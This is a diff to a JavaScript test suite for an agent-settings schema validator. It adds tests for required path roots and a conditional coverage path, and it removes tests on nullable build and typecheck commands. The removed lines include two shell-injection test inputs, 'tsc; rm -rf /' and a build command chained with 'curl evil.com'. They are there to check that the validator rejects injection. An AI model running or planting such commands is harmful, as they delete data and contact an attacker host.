@@ -4,6 +4,14 @@ import { getSettingsValidator } from '../.agents/scripts/lib/config-settings-sch
 
 const validate = getSettingsValidator();
 
+/** Schema-required roots — Epic #730 Story 4. Spread into accept-test inputs
+ * that aren't exercising the required-key behaviour itself. */
+const REQ = Object.freeze({
+  agentRoot: '.agents',
+  docsRoot: 'docs',
+  tempRoot: 'temp',
+});
+
 const expectErrors = (settings, ...needles) => {
   const ok = validate(settings);
   assert.equal(ok, false, 'expected schema validation to fail');
@@ -19,6 +27,7 @@ describe('AGENT_SETTINGS_SCHEMA — explicit number/object entries', () => {
   it('accepts integer maxTokenBudget / executionTimeoutMs / executionMaxBuffer', () => {
     assert.equal(
       validate({
+        ...REQ,
         maxTokenBudget: 200000,
         executionTimeoutMs: 300000,
         executionMaxBuffer: 10485760,
@@ -41,7 +50,7 @@ describe('AGENT_SETTINGS_SCHEMA — explicit number/object entries', () => {
 
   it('accepts riskGates with heuristics array', () => {
     assert.equal(
-      validate({ riskGates: { heuristics: ['no destructive ops'] } }),
+      validate({ ...REQ, riskGates: { heuristics: ['no destructive ops'] } }),
       true,
     );
   });
@@ -58,7 +67,10 @@ describe('AGENT_SETTINGS_SCHEMA — explicit number/object entries', () => {
   });
 
   it('accepts qualityGate with checks array', () => {
-    assert.equal(validate({ qualityGate: { checks: ['lint', 'test'] } }), true);
+    assert.equal(
+      validate({ ...REQ, qualityGate: { checks: ['lint', 'test'] } }),
+      true,
+    );
   });
 
   it('rejects unknown property on qualityGate', () => {
@@ -71,6 +83,7 @@ describe('AGENT_SETTINGS_SCHEMA — explicit number/object entries', () => {
   it('accepts a full frictionThresholds block', () => {
     assert.equal(
       validate({
+        ...REQ,
         frictionThresholds: {
           repetitiveCommandCount: 3,
           consecutiveErrorCount: 3,
@@ -104,43 +117,90 @@ describe('AGENT_SETTINGS_SCHEMA — explicit number/object entries', () => {
   });
 });
 
-describe('AGENT_SETTINGS_SCHEMA — nullable optional commands', () => {
-  it('accepts null typecheckCommand (disabled)', () => {
-    assert.equal(validate({ typecheckCommand: null }), true);
-  });
-
-  it('accepts null buildCommand (disabled)', () => {
-    assert.equal(validate({ buildCommand: null }), true);
-  });
-
-  it('accepts a non-empty string typecheckCommand', () => {
-    assert.equal(validate({ typecheckCommand: 'tsc --noEmit' }), true);
-  });
-
-  it('accepts a non-empty string buildCommand', () => {
-    assert.equal(validate({ buildCommand: 'npm run build' }), true);
-  });
-
-  it('rejects empty-string typecheckCommand', () => {
-    expectErrors({ typecheckCommand: '' }, /typecheckCommand/);
-  });
-
-  it('rejects empty-string buildCommand', () => {
-    expectErrors({ buildCommand: '' }, /buildCommand/);
-  });
-
-  it('rejects shell injection in typecheckCommand', () => {
-    expectErrors({ typecheckCommand: 'tsc; rm -rf /' }, /typecheckCommand/);
-  });
-
-  it('rejects shell injection in buildCommand', () => {
+describe('AGENT_SETTINGS_SCHEMA — required path roots (Epic #730 Story 4)', () => {
+  it('rejects an empty agentSettings block, naming all three required keys', () => {
     expectErrors(
-      { buildCommand: 'npm run build && curl evil.com' },
-      /buildCommand/,
+      {},
+      /must have required property 'agentRoot'/,
+      /must have required property 'docsRoot'/,
+      /must have required property 'tempRoot'/,
     );
   });
 
-  it('rejects non-string non-null typecheckCommand', () => {
-    expectErrors({ typecheckCommand: 42 }, /typecheckCommand/);
+  it('rejects a block missing only agentRoot, naming the missing key', () => {
+    expectErrors(
+      { docsRoot: 'docs', tempRoot: 'temp' },
+      /must have required property 'agentRoot'/,
+    );
+  });
+
+  it('rejects a block missing only docsRoot, naming the missing key', () => {
+    expectErrors(
+      { agentRoot: '.agents', tempRoot: 'temp' },
+      /must have required property 'docsRoot'/,
+    );
+  });
+
+  it('rejects a block missing only tempRoot, naming the missing key', () => {
+    expectErrors(
+      { agentRoot: '.agents', docsRoot: 'docs' },
+      /must have required property 'tempRoot'/,
+    );
+  });
+
+  it('accepts a block that declares all three roots', () => {
+    assert.equal(validate({ ...REQ }), true);
+  });
+});
+
+describe('AGENT_SETTINGS_SCHEMA — maintainability.crap conditional coveragePath', () => {
+  it('accepts crap with enabled=false and no coveragePath', () => {
+    assert.equal(
+      validate({
+        ...REQ,
+        maintainability: { crap: { enabled: false } },
+      }),
+      true,
+    );
+  });
+
+  it('accepts crap with requireCoverage=false and no coveragePath', () => {
+    assert.equal(
+      validate({
+        ...REQ,
+        maintainability: {
+          crap: { enabled: true, requireCoverage: false },
+        },
+      }),
+      true,
+    );
+  });
+
+  it('rejects crap when enabled+requireCoverage are true but coveragePath is absent', () => {
+    expectErrors(
+      {
+        ...REQ,
+        maintainability: {
+          crap: { enabled: true, requireCoverage: true },
+        },
+      },
+      /must have required property 'coveragePath'/,
+    );
+  });
+
+  it('accepts crap when enabled+requireCoverage are true and coveragePath is present', () => {
+    assert.equal(
+      validate({
+        ...REQ,
+        maintainability: {
+          crap: {
+            enabled: true,
+            requireCoverage: true,
+            coveragePath: 'coverage/coverage-final.json',
+          },
+        },
+      }),
+      true,
+    );
   });
 });
